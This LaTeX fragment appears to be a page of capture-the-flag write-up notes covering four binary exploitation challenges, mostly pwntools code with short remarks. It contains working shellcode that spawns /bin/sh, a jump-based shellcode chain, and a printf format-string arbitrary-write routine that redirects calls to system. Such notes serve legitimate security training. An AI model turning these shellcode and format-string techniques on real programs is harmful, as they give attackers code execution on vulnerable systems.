\documentclass[main.tex]{subfiles}

\begin{document}

% 20 - 20 - 24 - 27 - 30 - 33
\begin{tikzpicture}
\end{tikzpicture}

\newpage

\begin{minipage}[t]{0.49\textwidth}
	\begin{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[\_]}] \texttt{[filtered-shellcode]} Trying to decompile the binary with Ghidra (or even IDA) is so weird and so time-consuming. The difficulty comes from the fact that the code manually forces stack alignments, so manual decompilation is a much better choice
		\begin{python}
			payload = asm(""" 
			    xor eax, eax ; mov al, 0x9D   ;   mov ebx, esp ; add ebx, eax   ;
			    push 0x00    ; mov edx, esp   ;   push ebx;nop ; mov ecx, esp   ;
			    xor eax, eax ; mov al, 0x0B   ;   int 0x80
			""") + b"/bin/sh\x00" # only one-or-two byte instructions are allowed
		\end{python}
		\item[\texttt{[\_]}] \texttt{[Bizz Fuzz]} The hardest part is \texttt{realizing} the need to write a tool to extract the vulnerable function; the rest is just a standard overflow vulnerability
		\begin{bash}
			# Extract and preprocess Ghidra decompiled functions that contain fgets
			grep -e 'void FUN.*' -e 'char local.*' -e '  fgets.*'                  | grep -oP "FUN[^\(]+|\[.*\]|,\K.*(?=,)"                              | tr '\n' ' ' | sed -E 's/ (F)/\n\1/g'
		\end{bash}
		
		\begin{minipage}[t]{0.46\textwidth}
			\begin{python}
				# Extract the vulnerable function
				def cast2int(x):
				    base = 16 if "x" in x else 10
				    return int(x, base)
				
				line = file.readline().split()
				while line:
				    if len(line) > 2:
				        FUNC, N, *L = line
				        N = int(N[1:-1])
				        L = map(cast2int, L)
				        L = [x for x in L if x > N]
				        if L:
				            print(FUNC, N, L)
				    line = file.readline().split()
			\end{python}
		\end{minipage}
		\hfill
		\begin{minipage}[t]{0.43\textwidth}
			\begin{python}
				# #inequality [: equality]
				FUN_0811e15f() # #9
				FUN_0814369d() # #8
				FUN_0813d5dc() # #9
				FUN_08144ba9() # #2
				FUN_08131f64() # #23
				FUN_0810aab4() # #0 : 5
				FUN_0808ba1f() # #0 : 1
				FUN_08049261() # fizzbuzz()
				
				def next_function(num):
				    fail_in_solving()
				    for i in range(num - 1):
				        succeed_in_solving()
				        fail_in_solving()
			\end{python}
		\end{minipage}
		\item[\texttt{[\_]}] \texttt{[handoff]} Nothing’s interesting there! Is that type of problem called Jump-Oriented Programming \texttt{(JOP)}?
		\begin{python}
			p.sendlineafter(b"2.", b"2")
			p.sendlineafter(b"Which", b"-10")
			sh = "mov rdi, rax; add rdi, 30; mov rsi, 0; mov rdx, 0; mov rax, 59"
			p.sendlineafter(b"What", asm(sh) + asm("syscall") + b"/bin/sh\x00")
			
			jmp_eax = 0x40116C
			p.sendlineafter(b"3.", b"3")
			sh = "add rax, 8; jmp rax; nop; nop; sub rax, 0x5a4; jmp rax"
			p.sendlineafter(b"Thank you", flat(asm(sh), b"????", jmp_eax))
		\end{python}
		
	\end{enumerate}
\end{minipage}
\hfill
\begin{minipage}[t]{0.49\textwidth}
	\begin{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[\_]}] \texttt{[fermat-strings]} My god, I forgot that \texttt{printf} can perform arbitrary writes! After searching for a while for format-string, I found a very useful resource: \href{https://hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/index.html}{\texttt{HackTricks}}, which gives me some f-string tricks and new insight into ``re-entering the vulnerability''\\\\
		\begin{minipage}[t]{0.50\textwidth}
			\begin{python}
				# def write(value, A):
				F = "%{0:06}x%{1:03}$hhn"
				
				val, N = value, 0
				while val:
				    val, N = val >> 8, N + 1
				
				n, P = 0x25, ""
				for i in range(N):
				    d, n = (value - n) & 0xFF, value
				    P += F.format(d, 43 + N * 2 + i)
				    value >>= 8
				
				return P, [A + i for i in range(N)]
			\end{python}
		\end{minipage}
		\hfill
		\begin{minipage}[t]{0.49\textwidth}
			\begin{python}
				# def read(A):
				F = "%{0:03}$hhs????????"
				return F.format(45), A
				
				# def round(F, *args):
				p.sendlineafter(b"A:", b"37")
				p.sendlineafter(b"B:", flat(b"30072003", F(*args)))
				
				#def send_payload(p):
				round(write, 0x400837, 0x601040)
				round(read, 0x601050)
				...
				round(write, SYSTEM, 0x601058)
				p.sendlineafter(b"A:", b"/bin/sh")
			\end{python}
		\end{minipage}
	\end{enumerate}
\end{minipage}
\end{document}
